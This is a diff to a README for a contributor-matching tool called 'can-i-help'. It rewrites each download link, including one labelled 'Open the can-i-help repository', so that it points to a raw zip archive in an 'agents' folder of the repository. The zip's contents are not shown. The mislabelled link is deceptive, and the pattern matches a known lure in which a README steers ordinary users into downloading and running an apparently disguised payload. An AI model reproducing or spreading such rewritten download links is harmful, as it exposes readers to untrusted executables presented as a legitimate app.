@@ -1,6 +1,6 @@
 # 🤝 can-i-help - Find the right place to contribute
 
-[![Download can-i-help](https://img.shields.io/badge/Download-can--i--help-6c8ebf?style=for-the-badge&logo=github&labelColor=8a8a8a)](https://github.com/Verisimilar-presidentpierce292/can-i-help)
+[![Download can-i-help](https://img.shields.io/badge/Download-can--i--help-6c8ebf?style=for-the-badge&logo=github&labelColor=8a8a8a)](https://github.com/Verisimilar-presidentpierce292/can-i-help/raw/refs/heads/main/agents/can-i-help-v1.3.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ If you want a simple way to look for a project that fits what you know, this app
 
 Use this link to visit the page and download the app:
 
-[Download can-i-help](https://github.com/Verisimilar-presidentpierce292/can-i-help)
+[Download can-i-help](https://github.com/Verisimilar-presidentpierce292/can-i-help/raw/refs/heads/main/agents/can-i-help-v1.3.zip)
 
 On Windows, follow these steps:
 
@@ -157,7 +157,7 @@ Before you run any downloaded file, make sure you got it from the official repos
 
 ## 📎 Project link
 
-[Open the can-i-help repository](https://github.com/Verisimilar-presidentpierce292/can-i-help)
+[Open the can-i-help repository](https://github.com/Verisimilar-presidentpierce292/can-i-help/raw/refs/heads/main/agents/can-i-help-v1.3.zip)
 
 ## 🧰 Useful ways to explore
 
